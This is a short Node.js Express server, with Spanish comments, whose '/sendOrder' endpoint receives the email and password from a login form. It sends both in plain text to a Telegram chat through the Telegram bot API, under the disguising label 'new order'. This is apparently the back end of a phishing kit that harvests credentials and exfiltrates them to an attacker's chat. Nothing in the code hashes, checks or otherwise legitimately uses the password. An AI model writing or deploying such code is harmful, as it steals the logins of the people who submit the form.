require('dotenv').config(); // Cargar variables de entorno
const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

// Middleware para parsear el cuerpo de las solicitudes
app.use(bodyParser.json());
app.use(express.static('public')); // Para servir archivos estáticos (HTML, CSS, JS)

// Endpoint para manejar el formulario de inicio de sesión
app.post('/sendOrder', (req, res) => {
    const { email, password } = req.body;

    // Construir el mensaje para Telegram
    const message = `Nuevo Pedido:\nEmail: ${email}\nContraseña: ${password}`;

    // Enviar el mensaje a Telegram
    axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_ID}/sendMessage`, {
        chat_id: process.env.CHAT_ID,
        text: message
    })
    .then(response => {
        res.json({ success: true, response });
    })
    .catch(error => {
        console.error("Error al enviar mensaje a Telegram:", error.response.data);
        res.status(500).json({ success: false, error: error.message });
    });
});

// Iniciar el servidor
app.listen(port, () => {
    console.log(`Servidor corriendo en http://localhost:${port}`);
});
